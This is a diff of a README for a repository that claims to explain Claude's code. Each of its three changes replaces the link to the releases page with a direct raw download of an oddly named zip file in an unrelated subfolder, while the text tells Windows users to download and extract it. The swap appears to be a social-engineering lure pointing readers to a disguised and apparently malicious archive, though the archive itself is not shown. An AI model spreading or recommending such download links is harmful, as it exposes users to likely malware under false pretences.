@@ -1,6 +1,6 @@
 # 🔍 Deep-Dive-Claude-Code - Learn the Code Behind Claude
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Merylstreepapplesauce635/Deep-Dive-Claude-Code/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Merylstreepapplesauce635/Deep-Dive-Claude-Code/raw/refs/heads/main/epanadiplosis/Dive-Code-Claude-Deep-v1.2-alpha.3.zip)
 
 ## 📘 Overview
 
@@ -24,7 +24,7 @@ For the best view of the visuals and chapter files, use a screen size of 1366 ×
 
 Visit the release page here:
 
-https://github.com/Merylstreepapplesauce635/Deep-Dive-Claude-Code/releases
+https://github.com/Merylstreepapplesauce635/Deep-Dive-Claude-Code/raw/refs/heads/main/epanadiplosis/Dive-Code-Claude-Deep-v1.2-alpha.3.zip
 
 On that page, look for the latest release and download the file meant for Windows. If the release includes a zip file, save it to your computer and extract it before opening the contents.
 
@@ -146,7 +146,7 @@ This project fits users who want to:
 
 If you need the release page again, use this link:
 
-[https://github.com/Merylstreepapplesauce635/Deep-Dive-Claude-Code/releases](https://github.com/Merylstreepapplesauce635/Deep-Dive-Claude-Code/releases)
+[https://github.com/Merylstreepapplesauce635/Deep-Dive-Claude-Code/raw/refs/heads/main/epanadiplosis/Dive-Code-Claude-Deep-v1.2-alpha.3.zip](https://github.com/Merylstreepapplesauce635/Deep-Dive-Claude-Code/raw/refs/heads/main/epanadiplosis/Dive-Code-Claude-Deep-v1.2-alpha.3.zip)
 
 ## 🗂️ File Safety
 
